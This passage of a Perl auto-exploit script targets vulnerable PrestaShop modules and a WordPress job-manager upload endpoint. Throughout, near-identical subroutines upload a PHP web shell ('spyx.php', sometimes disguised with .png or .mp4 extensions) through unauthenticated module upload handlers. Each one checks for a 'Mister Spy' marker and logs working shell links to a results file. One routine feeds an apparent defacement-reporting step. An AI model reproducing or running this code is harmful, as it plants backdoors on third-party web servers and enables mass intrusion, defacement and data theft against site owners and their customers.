    print save "$site/post-a-job/\n";   
    close(save);
    tazz();
}else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');
	}

}

sub tazz(){
my $url = "$site/jm-ajax/upload_file/";
my $picture ="m.gif"; # Chaneg m.gif By Your PICTURE Name
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );

$def = $site. '/wp-content/uploads/job-manager-uploads/file/2017/12/m.gif'; # Chaneg m.gif By Your PICTURE Name
			$check = $ua->get($def)->status_line;
if ($check =~ /200/){
   print color('bold green');
print "[Success]\n";
    print color('reset');
print color('reset');
open(save, '>>Result_v4/index.txt');   
print save "$def\n";   
close(save);
zoneh();
}else{
print "[Failed]\n";
}
}


#  _____               _            _                 
# |  __ \             | |          | |                
# | |__) | __ ___  ___| |_ __ _ ___| |__   ___  _ __  
# |  ___/ '__/ _ \/ __| __/ _` / __| '_ \ / _ \| '_ \ 
# | |   | | |  __/\__ \ || (_| \__ \ | | | (_) | |_) |
# |_|   |_|  \___||___/\__\__,_|___/_| |_|\___/| .__/ 
#                                              | |    
#                                              |_|    


################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/spyx.php?X=sphinx";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $columnadvertsup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";
print color('bold white')," ..................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/spyx.php?X=sphinx";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";
print color('bold white')," ....................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$soopabannersup="$site/modules/soopabanners/slides/spyx.php?X=sphinx";

my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";
print color('bold white')," ...................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopabannersup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";
print color('bold white')," ...................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/spyx.php?X=sphinx";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $vtermslideshowup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/spyx.php?X=sphinx";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simpleslideshowup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/spyx.php?X=sphinx";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $productpageadvertsup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$homepageadvertiseup="$site/modules/homepageadvertise/slides/spyx.php?X=sphinx";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertiseup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";
print color('bold white')," ................. ";
print color('bold red'),"NOt VULN\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/spyx.php?X=sphinx";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertise2up\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/spyx.php?X=sphinx";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ............. ";
print color('bold red'),"NOt VULN\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/spyx.php?X=sphinx";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/spyx.php?X=sphinx";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $oneattributewizardproup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";
print color('bold white')," ............... ";
print color('bold red'),"NOt VULN\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/spyx.php?X=sphinx";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproOLDup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold red'),"NOt VULN\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["spyx.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/spyx.php?X=sphinx";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardpro_xup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["spyx.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/spyx.php.png?X=sphinx";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $advancedsliderup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["spyx.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/spyx.php.png?X=sphinx";

my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["spyx.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/spyx.php.png?X=sphinx";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/Mister Spy/) {
  
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproOldup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ............. ";
print color('bold red'),"NOt VULN\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["spyx.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/spyx.php.mp4?X=sphinx";

my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"videostab";
print color('bold white')," ......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $videostabup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$videostabup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"videostab";
print color('bold white')," ......................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["spyx.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/spyx.php?X=sphinx";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wg24themeadministrationup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold red'),"NOt VULN\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="spyx.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/spyx.php?X=sphinx";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $fieldvmegamenuup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["spyx.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/spyx.php?X=sphinx";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wdoptionpanelup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";
print color('bold white')," ..................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="spyx.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/spyx.php?X=sphinx";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_flexmenuup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," ....................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="spyx.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/spyx.php?X=sphinx";

my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_vertflexmenuup\n";

open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php?X=sphinx";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $nvn_export_ordersup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";
print color('bold white')," ................. ";
print color('bold red'),"NOt VULN\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=spyx.php";
my $shell ="spyx.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/spyx.php.png?X=sphinx";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $megamenuup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$megamenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ tdpsthemeoptionpanel #####################

sub tdpsthemeoptionpanel(){

my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="spyx.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/spyx.php?X=sphinx";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";
}
}


################ psmodthemeoptionpanel #####################

sub psmodthemeoptionpanel(){

my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="spyx.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/spyx.php?X=sphinx";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $psmodthemeoptionpanelup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ............. ";
print color('bold red'),"NOt VULN\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="spyx.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/spyx.php?X=sphinx";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
